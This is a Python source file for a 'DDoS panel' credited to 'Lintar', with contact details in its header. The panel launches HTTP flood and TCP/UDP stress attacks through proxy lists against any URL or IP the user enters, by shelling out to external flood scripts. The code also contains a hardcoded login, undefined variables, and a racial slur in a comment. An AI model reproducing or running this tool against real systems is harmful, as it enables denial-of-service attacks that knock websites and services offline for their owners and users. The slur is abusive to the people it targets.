
## A NEAT AND FRESH NEW LOOK.             ##
## THIS FILE WAS CLEANING BY LINTAR!  ##
## ITS DDoS PANEL BY LINTAR!                    ##
## TELERAGM: @Lintar21                               ##
## WhatsApp: +6281247891005                  ##

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def lod():
	print('Wait!')

def atas():
	sys.stdout.write(f"\x1b]2; ItsNet --> Stars: [{bots}] | Online Users: [Infinity] | Methods: [Infinity] | Bypass: [Infinity]\x07")
	print('                  Its-Network DDoS Panel By Lintar                  ')
	print('                         ProxyFile Name : proxy.txt                         ')
	print("")

def logo():
	clear()
	atas()
	print(""" 
██▓▄▄▄█████▓  ██████       
▓██▒▓  ██▒ ▓▒▒██    ▒          ItsNet Panel By: Lintar          
▒██▒▒ ▓██░ ▒░░ ▓██▄           Staff By: Stret,Ibra
░██░░ ▓██▓ ░   ▒   ██▒                    
░██░  ▒██▒ ░ ▒██████▒▒       
░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
 ▒ ░    ░    ░ ░▒  ░ ░
 ▒ ░  ░      ░  ░  ░  
 ░                 ░  
                                      
 """)
	
def methods():
	clear()
	print("""
» Layer7: 
	BYPASS <url> <time> <thread> <rps> <proxy>
	ITS <URL> <RPS> <TIME> <THREAD>
	HTTP <url> <req_per_ip> <time>
	FLOOD <url> <threads> METHODS<get/post> <time>
	
» Layer4:         
	STRESS <ip> <port> <mode> <connection> <seconds> <timeout>
	
» Tools:
	PAPING <ip> <port> <time>
	Proxy ( Proxy Scraper )

» Note: The methods will always be upgraded!
""")

def main():
    logo()
    while(True):
        cnc = input('''@Lintar\n ==>''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
		
# LAYER 7 METHODS
                
        elif "BYPASS" in cnc:
            try:
                urlT = cnc.split()[1]
                timeT = cnc.split()[2]
                rateT = cnc.split()[3]
                threadT = cnc.split()[4]
                proxyT = cnc.split()[5]
                os.system(f'node NOX.js {urlT} {timeT} {threadT} {rateT} {proxyT}')
                print(f"""                   
                    ██╗████████╗███████╗                     
                    ██║╚══██╔══╝██╔════╝
                    ██║   ██║   ███████╗
                    ██║   ██║   ╚════██║
                    ██║   ██║   ███████║
                    ╚═╝   ╚═╝   ╚══════╝                                       
     ╚╦═══════════════════════╦╝
╔═════╩═══════════════╩═════╗
                                           TARGET : {urlT}
                                           TIME : {timeT}
                                           THREAD : {threadT}
                                           RPS : {rateT}
                                           PROXY : {proxyT}
                                           METHOD : {Method}
                                           VVIP : True
                                           USER : Lintar21
╚═══════════════════════════╝
""")
            except IndexError:
                print('Usage: BYPASS <url> <time> <thread> <rps> <proxy>')

        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                print(f"""                   
                    ██╗████████╗███████╗                     
                    ██║╚══██╔══╝██╔════╝
                    ██║   ██║   ███████╗
                    ██║   ██║   ╚════██║
                    ██║   ██║   ███████║
                    ╚═╝   ╚═╝   ╚══════╝                                       
     ╚╦═══════════════════════╦╝
╔═════╩═══════════════╩═════╗
                                           TARGET : {url}
                                           PORT : {Port}
                                           THREAD {thread}
                                           TIME : {time}
                                           METHOD : {method}
                                           VVIP : True
                                           USER : Lintar21
╚═══════════════════════════╝
""")
            except IndexError:
                print('Usage: FLOOD <url> <threads> METHODS<GET/POST> <time>')
                print('Example: FLOOD http://example.com 15000 get 60')
		    
        elif "ITS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node ITS.js {target} {time} {Rate} {threads}')
                print(f"""                   
                    ██╗████████╗███████╗                     
                    ██║╚══██╔══╝██╔════╝
                    ██║   ██║   ███████╗
                    ██║   ██║   ╚════██║
                    ██║   ██║   ███████║
                    ╚═╝   ╚═╝   ╚══════╝                                       
     ╚╦═══════════════════════╦╝
╔═════╩═══════════════╩═════╗
                                           TARGET : {target}
                                           PORT : 443
                                           RPS : {Rate}
                                           THREAD : {threads}
                                           TIME : {time}
                                           METHOD : ITS
                                           VVIP : True
                                           USER : Lintar21
╚═══════════════════════════╝
""")
            except IndexError:
                print('Usage: ITS <TARGET> <TIME> <RPS> <THREADS>')
                print('Example: ITS https://example.com 60 512 100') 

        elif "HTTP" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hold.js {url} {time} 64 10 proxy.txt')
                os.system(f'node gflood.js {url} {time} 64 10 proxy.txt')
                print(f"""                   
                    ██╗████████╗███████╗                     
                    ██║╚══██╔══╝██╔════╝
                    ██║   ██║   ███████╗
                    ██║   ██║   ╚════██║
                    ██║   ██║   ███████║
                    ╚═╝   ╚═╝   ╚══════╝                                       
     ╚╦═══════════════════════╦╝
╔═════╩═══════════════╩═════╗
                                           TARGET : {url}
                                           PORT : 443
                                           TIME : {time}
                                           METHOD : HTTP
                                           VVIP : True
                                           USER : Lintar21
╚═══════════════════════════╝
""")
            except IndexError:
                print('Usage: HTTP <url> <time>')

# LAYER 4 METHODS

        elif "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: STRESS <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# TOOLS

        elif "PROXY" in cnc:
            try:
                os.system(f'python3 text.py')
            except IndexError:
                print('Usage: PROXY')
                print('Example: PROXY')

        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port> <time>')
                print('Example: paping 1.1.1.1 443 120')
                
                
#only niggs dont understand


        elif "Help" in cnc:
            print(f'''         
» Methods : To show methods 
» Clear: To clear all messages
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                

# LOG-IN

def login():
    clear()
    user = "2"
    passwd = "2"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to Its DDoS Panel!!!...")
        time.sleep(0.3)
        main()

login()
